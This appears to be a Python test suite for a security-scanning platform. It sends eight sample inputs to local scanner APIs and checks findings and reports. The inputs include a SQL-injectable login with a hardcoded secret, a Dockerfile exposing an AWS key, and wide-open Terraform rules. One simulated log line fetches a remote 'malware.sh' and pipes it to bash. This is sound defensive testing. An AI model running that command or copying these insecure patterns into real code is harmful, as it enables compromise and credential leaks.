"""
CORE — Complete Automated Verification Suite for All 8 Scanners / Services
Runs real backend scans for each of the 8 scanners and verifies session state, findings, and reports.
"""
import asyncio
import json
import os
import sys
import time
import httpx

API = "http://localhost:8000/api/v1"

TEST_CASES = [
    {
        "id": 1,
        "name": "🛡️ SAST Code Scanner",
        "hint": "CODE",
        "agents": ["DevSecOpsAgent"],
        "input": """
def login(username, password):
    # Hardcoded secret
    JWT_SECRET = "secret_key_1234567890_super_secret"
    # SQL Injection
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    return db.execute(query).fetchall()
"""
    },
    {
        "id": 2,
        "name": "🐳 Dockerfile Auditor",
        "hint": "CODE",
        "agents": ["DevSecOpsAgent"],
        "input": """
FROM ubuntu:latest
USER root
ENV AWS_SECRET_ACCESS_KEY="AKIAIOSFODNN7EXAMPLE_SECRET"
RUN apt-get update && apt-get install -y curl
CMD ["bash"]
"""
    },
    {
        "id": 3,
        "name": "🏗️ Terraform / IaC Analyzer",
        "hint": "CODE",
        "agents": ["DevSecOpsAgent", "ComplianceAgent"],
        "input": """
resource "aws_security_group" "allow_all" {
  name        = "allow_all"
  description = "Allow all inbound traffic"
  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
resource "aws_s3_bucket" "public_bucket" {
  bucket = "my-company-confidential-backups"
  acl    = "public-read"
}
"""
    },
    {
        "id": 4,
        "name": "📊 Incident Triage Engine",
        "hint": "LOGS",
        "agents": ["IncidentTriageAgent", "RemediationAgent"],
        "input": """
Jul 30 08:12:10 web-prod sshd[4012]: Failed password for invalid user admin from 198.51.100.45 port 49152 ssh2
Jul 30 08:12:12 web-prod sshd[4012]: Failed password for invalid user admin from 198.51.100.45 port 49153 ssh2
Jul 30 08:12:15 web-prod sshd[4015]: Accepted password for root from 198.51.100.45 port 49155 ssh2
Jul 30 08:12:20 web-prod bash[4020]: curl http://198.51.100.45/malware.sh | bash
"""
    },
    {
        "id": 5,
        "name": "🔍 Threat Enricher",
        "hint": "IOC",
        "agents": ["IncidentTriageAgent", "ThreatIntelAgent"],
        "input": """
Suspicious IP: 185.220.101.47
Malicious Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
Command and Control Domain: cobaltstrike-c2.malicious-site.com
"""
    },
    {
        "id": 6,
        "name": "📜 GRC Compliance Mapper",
        "hint": "CODE",
        "agents": ["ComplianceAgent", "ExecReportingAgent"],
        "input": """
# Security audit for PCI DSS and ISO 27001 compliance
Unencrypted credit card storage in database: card_number VARCHAR(16) stored as plain text.
Missing multi-factor authentication (MFA) on administrative SSH access to database server.
TLS 1.0 enabled on public API endpoint.
"""
    },
    {
        "id": 7,
        "name": "🎯 CVE & ATT&CK Intelligence",
        "hint": "CVE",
        "agents": ["ThreatIntelAgent"],
        "input": """
CVE-2024-3400: Palo Alto Networks PAN-OS Command Injection Vulnerability in GlobalProtect feature.
CVSS 10.0 critical severity threat actor exploitation.
Need MITRE ATT&CK TTP mapping and YARA/Sigma threat hunting rules.
"""
    },
    {
        "id": 8,
        "name": "📄 Executive PDF Report",
        "hint": "MIXED",
        "agents": ["IncidentTriageAgent", "DevSecOpsAgent", "ThreatIntelAgent", "ExecReportingAgent"],
        "input": """
Critical security breach report:
Attacker IP 198.51.100.45 compromised web application via SQL injection.
Exploited CVE-2023-44487 HTTP/2 Rapid Reset attack.
AWS IAM credentials leaked in application log files.
Generate executive PDF report for SOC management.
"""
    }
]

async def main():
    print("=" * 80)
    print("      🚀 CORE PLATFORM — ALL 8 SPECIALIZED SCANNERS TEST SUITE")
    print("=" * 80)

    async with httpx.AsyncClient(timeout=60.0) as client:
        # 1. Authenticate
        print("\n[1/3] Authenticating test user...")
        reg_res = await client.post(f"{API}/auth/local/register", json={
            "username": "scanner_qa_admin",
            "password": "QAPassword123!"
        })
        login_res = await client.post(f"{API}/auth/local/login", json={
            "username": "scanner_qa_admin",
            "password": "QAPassword123!"
        })
        if login_res.status_code != 200:
            print(f"❌ Auth failed: {login_res.text}")
            sys.exit(1)
        token = login_res.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}
        print("✅ Authenticated successfully!")

        # 2. Run all 8 Scanners
        print("\n[2/3] Executing Scanner Tests...")
        results = []

        for tc in TEST_CASES:
            print(f"\n────────────────────────────────────────────────────────────")
            print(f"Testing Scanner #{tc['id']}: {tc['name']}")
            print(f"Target Agents: {', '.join(tc['agents'])}")
            
            payload = {
                "input": tc["input"].strip(),
                "input_type_hint": tc["hint"],
                "mode": "custom",
                "selected_agents": tc["agents"]
            }

            start_t = time.time()
            res = await client.post(f"{API}/scan", headers=headers, json=payload)
            if res.status_code != 202:
                print(f"❌ Failed to initiate scan: {res.text}")
                results.append((tc['name'], "FAILED_INIT", 0, 0))
                continue

            scan_data = res.json()
            session_id = scan_data["session_id"]
            print(f"  Session ID: {session_id} | Status: {scan_data['status']}")

            # Poll for session completion (up to 45 seconds per scanner)
            completed = False
            for _ in range(30):
                await asyncio.sleep(1.5)
                s_res = await client.get(f"{API}/sessions/{session_id}", headers=headers)
                if s_res.status_code == 200:
                    s_data = s_res.json()
                    status = s_data.get("status")
                    if status in ("completed", "failed"):
                        completed = True
                        elapsed = time.time() - start_t
                        
                        # Fetch findings
                        f_res = await client.get(f"{API}/incidents/{session_id}/findings", headers=headers)
                        findings = f_res.json().get("findings", []) if f_res.status_code == 200 else []
                        
                        # Fetch PDF & Markdown availability
                        rep_md = await client.get(f"{API}/reports/{session_id}/markdown", headers=headers)
                        rep_pdf = await client.get(f"{API}/reports/{session_id}/pdf", headers=headers)
                        has_md = rep_md.status_code == 200
                        has_pdf = rep_pdf.status_code == 200

                        print(f"  ✅ Completed in {elapsed:.2f}s | Status: {status}")
                        print(f"  📊 Total Findings: {len(findings)} | Critical: {sum(1 for f in findings if f.get('severity') == 'CRITICAL')}")
                        print(f"  📄 Reports Generated: Markdown ({'YES' if has_md else 'NO'}), PDF ({'YES' if has_pdf else 'NO'})")
                        
                        for f in findings[:2]:
                            print(f"     • [{f.get('severity')}] {f.get('title')} ({f.get('category')})")

                        results.append((tc['name'], status.upper(), len(findings), elapsed))
                        break

            if not completed:
                print(f"  ⚠️ Timeout waiting for scanner completion")
                results.append((tc['name'], "TIMEOUT", 0, 45.0))

        # 3. Final Summary Report
        print("\n" + "=" * 80)
        print("                  SUMMARY OF SCANNER VERIFICATION RESULTS")
        print("=" * 80)
        print(f"{'Scanner Name':<35} | {'Status':<10} | {'Findings':<10} | {'Time (s)':<10}")
        print("-" * 75)
        all_passed = True
        for name, status, findings_cnt, elapsed in results:
            print(f"{name:<35} | {status:<10} | {findings_cnt:<10} | {elapsed:<10.2f}")
            if status != "COMPLETED":
                all_passed = False
        print("-" * 75)
        
        if all_passed:
            print("\n🎉 ALL 8 SPECIALIZED SCANNERS & SERVICES ARE FULLY VERIFIED AND WORKING PERFECTLY!")
        else:
            print("\n⚠️ Some scanners had issues. Review execution logs above.")

if __name__ == "__main__":
    asyncio.run(main())
